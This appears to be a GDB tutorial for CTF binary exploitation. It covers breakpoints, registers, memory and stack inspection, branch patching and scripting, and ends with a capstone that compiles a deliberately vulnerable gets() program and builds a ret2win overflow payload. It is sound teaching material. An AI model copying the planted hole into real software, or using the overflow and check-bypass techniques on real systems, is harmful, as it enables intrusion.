Lesson 01 · Foundations
Starting GDB & Basic Navigation
Before you can pwn anything, you need to know how to launch GDB, attach to a process, load symbols, and find your way around. This is your entry point.
Launching
shell
gdb ./binary # Load binary (no run yet) gdb -q ./binary # Quiet mode — suppress banner gdb ./binary core # Load binary with a core dump gdb -p <pid> # Attach to running process gdb --args ./binary arg1 arg2 # Pass args at launch
💡 Tip
Always use gdb -q in CTFs. The banner wastes screen space.
Running the Binary
gdb
run # or just: r run arg1 arg2 # Run with arguments run < input.txt # Redirect stdin run $(python3 -c 'print("A"*100)') # Classic overflow test
Essential Housekeeping
CommandShortWhat it does
quitqExit GDB
help <cmd>hGet help on any command
set args arg1 arg2—Set args for next run
show args—Check currently set args
info files—Info about loaded binary
set disassembly-flavor intel—Intel syntax (do this always)
⚡ Pro Move
Put set disassembly-flavor intel in your ~/.gdbinit so you never have to type it again. Also add set pagination off to disable the annoying "press enter to continue" prompts.
Recommended ~/.gdbinit
~/.gdbinit
set disassembly-flavor intel set pagination off set confirm off set print pretty on

Lesson 02 · Foundations
Breakpoints
Breakpoints are how you stop execution at the exact moment you care about. In CTFs this means: right before a comparison, inside a decryption routine, or at a suspicious function call.
Setting Breakpoints
gdb
break main # Break at start of main (needs symbols) b main # Same, shorthand b *0x401234 # Break at EXACT address (no symbols needed) b *main+42 # Break 42 bytes into main b strcmp # Break at libc strcmp (plt or real) b filename.c:37 # Break at source line (if compiled with -g) tb main # Temporary breakpoint (auto-deletes after hit)
⚠ CTF Reality
Most CTF binaries are stripped — no symbols. You'll be using b *0xADDRESS almost exclusively. Get comfortable finding addresses via disassembly first.
Managing Breakpoints
gdb
info breakpoints # List all breakpoints (also: i b) delete 2 # Delete breakpoint #2 delete # Delete ALL breakpoints (prompts) disable 1 # Disable without deleting enable 1 # Re-enable clear main # Clear bp at function name
Conditional Breakpoints (very powerful)
gdb
b main if argc > 2 # Only break if condition true b *0x401234 if $rax == 0 # Break only when rax is 0 condition 2 $rdi == 0x41 # Add condition to existing bp #2 condition 2 # Remove condition from bp #2 ignore 1 5 # Skip bp #1 the next 5 times
💡 Real Use Case
In a loop that runs 10,000 times, instead of hitting 'c' repeatedly — use ignore 1 9999 to break on the 10000th iteration.
Commands on Breakpoint
gdb — auto-print when a bp is hit
commands 1 # Attach commands to bp #1 > printf "rax = %d\n", $rax > continue > end # Now every time bp 1 is hit, it prints rax and continues # This is GOLD for tracing loops without manual interaction

Lesson 03 · Foundations
Execution Control
After hitting a breakpoint, you need precise control over where execution goes next. The difference between next and step has saved (and cost) many CTF players hours.
The Core Four
CommandShortWhat it does
continuecResume until next breakpoint or crash
nextnExecute one C line, step OVER function calls
stepsExecute one C line, step INTO function calls
finishfinRun until current function returns, show return value
Assembly-Level Control (what you actually use in CTFs)
CommandShortWhat it does
nextiniOne INSTRUCTION, step over calls
stepisiOne INSTRUCTION, step into calls
until *0x401234uRun until address (great for skipping loops)
jump *0x401234jJump execution to address (does NOT update stack!)
⚠ Key Distinction
next/step work at source level. In stripped binaries, use nexti/stepi — they work at the instruction level regardless of debug info.
Useful Extras
gdb
ni 10 # Execute 10 instructions (step N times) c 5 # Continue, but stop after hitting bp 5 more times return 0 # Force current function to return with value 0 call printf("hi\n") # Call arbitrary functions mid-execution signal SIGSEGV # Send a signal to the process
The Trick: Enter key repeats last command
⚡ Speed Tip
After typing ni, just pressing Enter repeats the last command. This is how you single-step quickly through assembly without retyping. Same for c, n, etc.

Lesson 04 · Foundations
Registers
Registers are where the action happens. In x86-64, function arguments, return values, comparisons — everything flows through registers. You need to read them fluently.
x86-64 Register Cheatsheet
RegisterRoleNotes
raxReturn valueAlso used for syscall number
rdi, rsi, rdxArgs 1, 2, 3System V AMD64 ABI calling convention
rcx, r8, r9Args 4, 5, 6After 6 args, they go on the stack
ripInstruction ptr"Where am I executing" — can't set directly
rspStack pointerPoints to top of stack
rbpBase pointerFrame base (locals accessed as rbp-N)
rflagsFlagsZF, CF, SF, OF — set after comparisons
💡 Memory Aid
rdi, rsi, rdx, rcx, r8, r9 → "Diane's Silk Dress Cost Real Nine"
Reading Registers
gdb
info registers # All registers (also: i r) info registers rax rdi # Specific registers only p $rax # Print rax as decimal p/x $rax # Print rax as hex p/s (char*)$rdi # Print rdi as string (if it's a char*) p/d $rdi # Decimal p/t $rax # Binary p $rip # Current instruction pointer
Register Sub-parts (important for CTFs)
x86-64 register anatomy
# rax is 64-bit. Sub-parts: p $rax # 64-bit (8 bytes) p $eax # lower 32 bits p $ax # lower 16 bits p $al # lower 8 bits p $ah # bits 8-15 # Same pattern for rbx/rcx/rdx, rdi/rsi -> edi/esi -> di/si
Expressions using registers
gdb
p $rax + $rbx # Arithmetic in GDB p $rsp + 8 # Address 8 bytes above stack pointer p/x *((long*)$rsp) # Dereference stack top as 64-bit int x/xg $rsp # Same thing, different syntax (explained in lesson 5)

Lesson 05 · Memory
Examining Memory: The x Command
The x command is your memory microscope. It reads raw bytes from any address and displays them in any format. This is how you find flags, strings, canaries, and hidden values.
x Command Syntax
syntax
x/NFS address # N = how many units to show (e.g., 10) # F = format letter (see below) # S = size letter (b=byte, h=half=2, w=word=4, g=giant=8) # address = hex addr, register, symbol name
Format Letters
FormatMeaningExample
xHexadecimalx/8xb $rsp
dDecimal (signed)x/4dw $rsp
uDecimal (unsigned)x/4uw $rbp
sNull-terminated stringx/s $rdi
iMachine instructionx/5i $rip
cCharacterx/4c $rdi
tBinaryx/4tb $rsp
aAddress (with symbol)x/4ag $rsp
Most Used Combos in CTFs
gdb — the ones you'll actually use
x/s $rdi # Print string (first arg to function) x/20xb $rsp # 20 bytes of stack as hex x/4xg $rsp # 4 quadwords (8 bytes each) of stack x/5i $rip # Next 5 instructions from current position x/s 0x402010 # Read string from .rodata or wherever x/xg $rbp-8 # Local variable at [rbp-8] x/xg $rbp+0x10 # Stack argument above base pointer x/xg $rsp # Top of stack (usually return address)
Dereferencing Pointers
gdb
# If rdi points to a struct or array: x/8xb $rdi # First 8 bytes of what rdi points to x/xg $rdi # First 8-byte value (possibly another pointer) x/xg *$rdi # Double dereference # Convenient cast with p: p *(int*)$rdi # Treat rdi as int* p *(char(*)[32])$rdi # Treat as char array of 32

Lesson 06 · Memory
Disassembly
You'll spend most of your CTF time reading disassembly. GDB's disas command is your primary lens for understanding what a binary actually does.
Disassembling
gdb
disas main # Disassemble main function disas # Disassemble current function (wherever rip is) disas /m main # Interleave source lines (if -g compiled) disas /r main # Show raw bytes alongside instructions disas 0x401000, 0x401050 # Disassemble a range of addresses x/20i main # Alternate: 20 instructions from main x/20i $rip # 20 instructions from current position
TUI Mode (Terminal UI)
gdb
layout asm # Persistent assembly window at top layout regs # Add register window layout src # Source code window (if debug info) layout split # Split: source + assembly tui enable # Enable TUI tui disable # Back to normal Ctrl+X A # Toggle TUI on/off Ctrl+X 1 # Single-window TUI Ctrl+X 2 # Two-window TUI focus cmd # Move keyboard focus to command window focus asm # Move focus to assembly window (scroll it)
💡 Workflow
layout asm + layout regs gives you a live view of registers and current instruction as you step. This is the closest to a "real" debugger UI experience in vanilla GDB.
Reading Disassembly for CTFs
example output — what to look for
Dump of assembler code for function main: 0x401150 <+0>: push rbp 0x401151 <+1>: mov rbp,rsp 0x401154 <+4>: cmp DWORD PTR [rbp-0x4],0x1337 <-- comparison! 0x40115b <+11>: jne 0x401170 <main+32> 0x40115d <+13>: call 0x401030 <puts@plt> <-- win path 0x401162 <+18>: jmp 0x401178 0x401170 <+32>: call 0x401030 <puts@plt> <-- lose path # Pattern: cmp + jne/je/jl/jg → find the comparison, set bp there # then examine what's being compared

Lesson 07 · Memory
Stack & Call Frames
The stack is everything in exploitation — return addresses, local variables, canaries, saved registers. You need to read it like a map.
Stack Layout (x86-64)
conceptual — when inside function f called by main
# High addresses [main's locals] [main's saved rbp] ← rbp+8 points here [return address] ← what rbp+8 actually IS in f's frame [saved rbp of main] ← $rbp in f points here [f's locals] [f's locals ...] ← $rsp points here (stack grows down) # Low addresses
Key Formula
*($rbp + 8) = return address of current function. In buffer overflow CTFs, overflowing a local buffer to reach rbp+8 is the classic goal.
Stack Navigation Commands
gdb
backtrace # Call stack (also: bt) bt full # Call stack with local variables frame 0 # Select frame 0 (current) frame 1 # Select parent frame up # Go up one frame down # Go down one frame info frame # Detailed info about current frame info locals # Local variables in current frame info args # Function arguments in current frame
Reading the Stack Directly
gdb
x/20xg $rsp # 20 qwords from stack top (best overview) x/xg $rbp+8 # Return address of current function x/xg $rbp # Saved rbp (previous frame's base) x/xg $rbp-8 # First local variable p $rbp - $rsp # Size of current stack frame
Finding Stack Canaries
CTF Context
Stack canaries sit between local buffers and the saved rbp. They're typically at [rbp - 8] and look like 0x????????00000000 (null byte in LSB). In GDB, after reading the stack with x/20xg $rsp, the value that looks "random" between your buffer and the return address is the canary.
gdb
# Find canary for binary compiled with -fstack-protector x/xg $rbp-8 # Often where canary lives p/x $gs:0x28 # Read canary from TLS directly (x86-64)

Lesson 08 · Power Tools
Modifying State
GDB doesn't just observe — it can rewrite registers, memory, and even jump execution. This is how you verify exploits, patch checks, and test hypotheses without recompiling.
Modifying Registers
gdb
set $rax = 0 # Set rax to 0 set $rdi = 0x1337 # Set function argument set $rip = 0x401234 # Jump to address (changes execution!) set $rsp = $rsp - 8 # Grow the stack manually set $eflags = $eflags | 0x40 # Set Zero Flag (makes JE jump)
Modifying Memory
gdb
set *0x601040 = 0x1337 # Write 4 bytes to address set {int}0x601040 = 42 # Same, explicit cast (4 bytes) set {long}0x601040 = 42 # Write 8 bytes set {char}0x601040 = 'A' # Write 1 byte set *((int*)$rbp-1) = 0 # Write to local variable
The CTF Classic: Patching a Branch
gdb — bypass a check by flipping ZF
# After a CMP instruction, before a JNE/JE: # ZF=1 means "equal", ZF=0 means "not equal" # JE jumps if ZF=1 | JNE jumps if ZF=0 # If you're at a JNE you want to NOT jump (take fall-through / "win" path): set $eflags = $eflags | 0x40 # Set ZF=1 → JNE won't jump # If you're at a JE you want to force the jump: set $eflags = $eflags & ~0x40 # Clear ZF=0 → JE won't jump set $eflags = $eflags | 0x40 # Set ZF=1 → JE will jump # Or just skip the jne entirely by jumping past it: set $rip = 0x40116a # Manually jump to the "win" address
⚡ Most Common CTF Trick
Stop right before a failing comparison. Flip ZF with set $eflags or directly set $rip to skip past the bad branch. This is how you quickly verify "if this check passed, would I get the flag?"
Calling Functions from GDB
gdb
call (void)system("ls") # Call system() while paused call (int)strlen("hello") # Call strlen, see return value call win() # Call arbitrary function

Lesson 09 · Power Tools
Watchpoints
Watchpoints stop execution when a memory location is read or written. When you don't know WHERE something changes — but you know WHERE the value lives — watchpoints find it for you.
Watchpoint Commands
gdb
watch *0x601040 # Break when this address is WRITTEN watch *$rbp-8 # Watch local variable at rbp-8 rwatch *0x601040 # Break when READ awatch *0x601040 # Break on READ or WRITE watch val # Watch variable by name (if symbols exist) info watchpoints # List all watchpoints
💡 Use Case
Classic scenario: you see a variable is 0 when it should be 1. Set a watch on it, run the program, and GDB will stop exactly when something writes to it. No more guessing which function is the culprit.
Hardware vs Software Watchpoints
gdb
# Hardware watchpoints: fast (CPU debug registers), limited to ~4 # Software watchpoints: unlimited but SLOW (GDB checks after every instr) set can-use-hw-watchpoints 0 # Force software watchpoints set can-use-hw-watchpoints 1 # Use hardware (default) # You'll hit the hw limit with 4+ watchpoints — GDB warns you

Lesson 10 · Power Tools
Searching Memory & Mappings
Sometimes you know what value you're looking for, but not where it is. GDB's find command lets you scan memory regions for byte patterns — essential for finding flags, shellcode, and gadgets.
find Command
gdb
find 0x400000, 0x401fff, "CTF{" # Find string in range find 0x400000, +0x10000, 0x41, 0x41 # Find bytes "AA" find /b 0x400000, 0x401fff, 0x90 # Find NOP bytes (/b = byte size) find /w 0x400000, 0x401fff, 0x1337 # Find 4-byte value find /g 0x400000, 0x401fff, 0x4141414141414141 # Find 8-byte value
💡 Tip
Use info proc mappings first to know which address ranges exist, then search within them. Searching outside valid ranges will error.

gdb

Lesson 11 · Power Tools
Scripting & Automation
Doing the same thing 50 times manually in GDB means you're losing CTF time. These techniques let you automate repetitive debugging tasks.
GDB Scripts (.gdb files)
solve.gdb
set pagination off set disassembly-flavor intel b main r x/20xg $rsp info registers q
shell — run it
gdb -q -x solve.gdb ./binary gdb -q --batch -x solve.gdb ./binary # Batch mode: runs script, exits, prints output
One-liners with -ex
shell
gdb -q -batch -ex 'b main' -ex 'r' -ex 'x/20xg $rsp' ./binary gdb -q -batch -ex 'disas main' ./binary # Quick disasm without entering GDB gdb -q -batch -ex 'info address main' ./binary # Get main's address
Python scripting inside GDB
gdb — Python available natively
python print(gdb.parse_and_eval("$rax")) python gdb.execute("info registers") # Script file: solve.py import gdb class HookBreak(gdb.Breakpoint): def stop(self): rax = gdb.parse_and_eval("$rax") print(f"rax = {int(rax):#x}") return False # False = don't actually stop, just log HookBreak("strcmp") gdb.execute("r")
shell — run python script
gdb -q -x solve.py ./binary
Defining Custom GDB Commands
gdb / ~/.gdbinit
define ctx # Define a command called 'ctx' info registers x/10i $rip x/20xg $rsp end # Now type 'ctx' in GDB to get a full context dump # (This is what pwndbg does automatically!)

checksec Output — What it Means
FlagMeaning for exploitation
NX enabledStack not executable → need ROP, not shellcode
Canary foundMust leak or brute-force canary for stack overflow
PIE enabledBinary base is randomized → need leak to know addresses
ASLRHeap/stack/libc randomized → need leaks
RELRO FullGOT is read-only → can't overwrite GOT entries
No PIE, No Canary, No NXClassic ret2shellcode — easy day

Final Challenge: Find the Buffer Overflow Offset
Capstone · 20 min
▼ expand
Compile (NO stack protection, NO PIE):
gcc -m64 -fno-stack-protector -no-pie -o vuln vuln.c
with: void win(){puts("you got it");} void vuln(){char buf[64]; gets(buf);} int main(){vuln();}

1. checksec — verify no canary, no PIE
2. In pwndbg: r <<< $(cyclic 200) — crash it
3. Note the value in $rsp after crash
4. cyclic -l VALUE_IN_RSP — get the offset
5. Find the address of win: p win
6. Craft: python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFFSET + WIN_ADDR_LITTLE_ENDIAN)'
7. r <<< YOUR_PAYLOAD — did it jump to win?

This is the complete GDB-assisted pwn workflow. Congratulations.
checksec → Canary: No, NX: enabled (that's fine, we're ret2win)
r <<< $(cyclic 200) → crash
cyclic -l $rsp → offset (probably 72 for 64-byte buf + 8 for saved rbp)
p win → e.g. 0x401136
payload: python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x36\x11\x40\x00\x00\x00\x00\x00")'
r <<< PAYLOAD
